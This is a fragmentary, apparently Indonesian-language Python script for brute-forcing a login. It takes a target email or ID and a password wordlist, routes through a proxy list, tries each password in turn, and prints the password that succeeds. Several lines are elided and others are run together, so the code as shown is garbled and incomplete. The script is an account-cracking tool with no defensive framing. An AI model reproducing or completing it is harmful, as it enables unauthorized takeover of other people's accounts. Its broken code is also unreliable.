...
proxies_list = [ 'http://10.10.1.10:3128',
...
Id = input('Email/ID/Nope : ')
sleep(1) 
sandi = input('Masukkan Password.txt : ') passw = open(sandi, 'r') 
print ('Try To Crack') 
def br(): 
...
print ('Mencoba', password,end="", flush=True) print ('\r', end="", flush=True) 
else: print ('Mencoba', password, end="", flush=True) 
sleep(1) 
print ('Login Succes\n') 
print ('Password Adalah ' + password) 
exit() 
print ('Passowrd.txt Habis Silahkan Coba Lagi') br()
